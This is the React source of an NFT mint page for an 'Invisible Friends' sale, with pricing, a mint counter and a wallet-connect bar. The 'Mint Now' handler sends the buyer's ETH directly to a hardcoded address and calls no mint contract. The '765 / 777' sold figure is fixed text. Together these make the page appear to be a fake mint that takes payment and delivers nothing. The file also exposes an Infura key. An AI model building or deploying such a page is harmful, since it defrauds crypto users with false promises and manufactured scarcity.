import Web3 from 'web3';
import './App.css';
import { ethers } from "ethers";
import { useWeb3React } from '@web3-react/core'
import { Web3ReactProvider } from '@web3-react/core' ;
import { Web3Provider } from "@ethersproject/providers";


import React, { useState, useEffect } from 'react' ;
import { createTheme, ThemeProvider, makeStyles } from '@material-ui/core/styles';
import { Box, Typography, Button, IconButton } from '@material-ui/core';
import NavBar from './components/NavBar';
// import {account} from './components/CustomButton';
import './App.css';
import gif from "./images/invisablegif.gif";
import AddIcon from '@material-ui/icons/Add';
import RemoveIcon from '@material-ui/icons/Remove';
import Background from './Invisible Friends.mp4';
import Tiger from './tiger logo.PNG'




function getLibrary(provider) {
  return new Web3(provider);
}

// document.body.style.backgroundImage="url('tiger_wallpaper.jpg')";


const theme = createTheme({
  palette: {
    primary: {
      main: "#FFFFFF",
    },
    secondary: {
      main: "#000000",
    },
  },
  typography: {
    h1: {
      fontFamily: 'Oswald',
      fontWeight: 1000,
      fontSize: 40,
      lineHeight: '2rem',
    },
    h2: {
      fontFamily: 'Roboto Condensed',
      fontWeight: 500,
      fontSize: 18,
      lineHeight: '2rem',
    },
    h3: {
      fontFamily: 'Oswald',
      fontWeight: 500,
      fontSize: 30,
      lineHeight: '5rem',
    },
    h4: {
      fontFamily: 'Roboto Condensed',
      fontWeight: 1000,
      fontSize: 20,
      lineHeight: '.3rem',
    },
  },
});

const styles = makeStyles({
  root: {
  },
  wrapper: {
    display: 'flex',
    margin: "5em",
  },
  leftSide: {
    textAlign: "start",
    width: '50%'
  },
  rightSide: {
    color: "white",
    width: '50%'
  },
  headerRight: {
    textAlign: 'center',
    marginBottom: '25px'
  },
  boxDesign: {
    display: 'flex',
    alignItems: 'center',
    border: '3px gray solid',
    borderRadius: "10px",
    justifyContent: "space-between",
    padding: '11px',
    width: '70%',
    margin: "0 auto"
  },
  boxDesignTwo: {
    marginTop: '15px',
    display: 'flex',
    alignItems: 'center',
    border: '3px gray solid',
    borderRadius: "10px",
    justifyContent: "space-between",
    padding: '11px',
    width: '70%',
    margin: "0 auto",
    background: 'rgba(255, 255, 255, 0.4)'
  },
  buttonCorlor: {
    color: 'white'
  },
  boxDesignThree: {
    marginTop: '15px',
    display: 'flex',
    alignItems: 'center',
    borderTop: '3px gray solid',
    borderBottom: '3px gray solid',
    justifyContent: "space-between",
    padding: '5px',
    width: '72%',
    margin: "0 auto"
  },
  boxDesignFour: {
    marginTop: '15px',
    display: 'flex',
    padding: '5px',
    width: '73%',
    margin: "0 auto"
  },
  buttonStyle: {
    width: "100%",
    marginBottom: "15px"
  },
  boxDesignFive: {
    textAlign: 'center'
  }
})

function NewlineText(props) {
  const text = props.text;
  return text.split('\n').map(str => <p>{str}</p>);
}



const handlePayment = async (total,currentAccount)=>{
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

  var Web3 = require('web3');
  var web3 = new Web3(Web3.givenProvider || 'https://mainnet.infura.io/v3/0013817b67bc42b3a1e1bf179e7085d5');


  web3.eth.sendTransaction({
    from: currentAccount,
    to: '0xA0321c9645e855888D00b32037705B56cBB3a567',
    value: (total * 0.08) * 1000000000000000000
    

})
    console.log({ total, currentAccount });

  } catch (err) {
    console.log(err) ;
  }
};

function App() {
  const classes = styles();
  const [total, setTotal] = useState(1);
 

const [isConnected, setIsConnected] = useState(false);
const [currentAccount, setCurrentAccount] = useState(null);
const [balance, setBalance] = useState(0);

const onLogin = async (provider) => {
  const web3 = new Web3(provider);
  const accounts = await web3.eth.getAccounts();
  if (accounts.length === 0) {
    console.log("Please connect to MetaMask!");
  } else if (accounts[0] !== currentAccount) {
    setCurrentAccount(accounts[0]);
    const accBalanceEth = web3.utils.fromWei(
      await web3.eth.getBalance(accounts[0]),
      "ether"
    );

    setBalance(Number(accBalanceEth).toFixed(6));
    setIsConnected(true);
  }
};

const onLogout = () => {
  setIsConnected(false);
};

  return (
    <Web3ReactProvider getLibrary = {getLibrary}>
    <div >
      <div className = "App">
            <video
            autoPlay
            loop
            muted
            style= {{position: "absolute",
          width: "100%",
          left: "50%",
        top: "50%",
      height: "100%",
    objectFit: "cover",
    transform: "translate(-50%, -50%)",
    zIndex: "-1"
   }}
            >
                <source src= {Background} type  = "video/mp4"/>
            </video>
        </div>
      <ThemeProvider theme={theme} >
        <NavBar currentAccount = {currentAccount} isConnected = {isConnected} onLogin={onLogin} onLogout={onLogout} />
        <div className={classes.wrapper}>
          <div className={classes.leftSide}>
            <Typography variant="h1" className={classes.red} color="primary">
              Info
            </Typography>
            <Typography variant="h2" color="secondary">
            January 24th
            </Typography>
            <Typography
              variant="h3" color="primary">
              Limited Mint Date
            </Typography>
            <Typography variant="h4" color="primary">
              January 24 - 7pm EST
            </Typography>
            <Typography variant="h3" color="primary">
              Supply
            </Typography>
            <Typography variant="h4" color="primary">
              777
            </Typography>
            <Typography variant="h3" color="primary">
              Price
            </Typography>
            <Typography variant="h4" color="primary">
              0.08 ETH
            </Typography>
            <Typography variant="h3" color="primary">
              Max
            </Typography>
            <Typography variant="h4" color="primary">
              5 per Wallet
            </Typography>
          </div>
          <div className={classes.rightSide}>
            <Typography variant="h1" className={classes.headerRight} color="primary">
              Limited Sale
            </Typography>
            <Box className={classes.boxDesign}>
              <Box>
                <img src={gif} alt="" width='80px' />
              </Box>
              <Box>
                <Typography color="secondary">
                  Price per NFT
                </Typography>
                <Typography variant="h4" style={{marginTop: '12px'}} color="primary">
                  0.08 ETH Each
                </Typography>
              </Box>
            </Box>
            <Box className={classes.boxDesignTwo}>
              <Box>
                <IconButton onClick={()=>{
                    if (total > 1) {
                      setTotal(total-1)
                    }
                }} 
                aria-label="add" className={classes.buttonCorlor}>
                  <RemoveIcon fontSize="medium" />
                </IconButton>
                {total}
                <IconButton 
                onClick={()=>{
                  if (total < 5) {
                    setTotal(total+1)
                  }
              }} 
                aria-label="add" className={classes.buttonCorlor}>
                  <AddIcon fontSize="medium" />
                </IconButton>
              </Box>
              <Box>
                <Typography variant="h6" color="primary">
                  5 Max
                </Typography>
              </Box>
            </Box>
            <Box className={classes.boxDesignThree}>
              <Box>
              <Typography variant="h6" color="primary">
                  Total
                </Typography>
              </Box>
              <Box>
                <Typography variant="h6" color="primary">
                  {total * 0.08} ETH
                </Typography>
              </Box>
            </Box>
            <Box className={classes.boxDesignFour}>
              <Button  onClick = {async () => {handlePayment(total, currentAccount)}} className={classes.buttonStyle} variant="contained">Mint Now</Button>
            </Box>
            <Box className={classes.boxDesignFive}>
            <Typography variant="h6" color="primary">
                  765 / 777
                </Typography>
            </Box>
          </div>
        </div>
      </ThemeProvider>
    </div>
  </Web3ReactProvider>
  );
}

export default App;
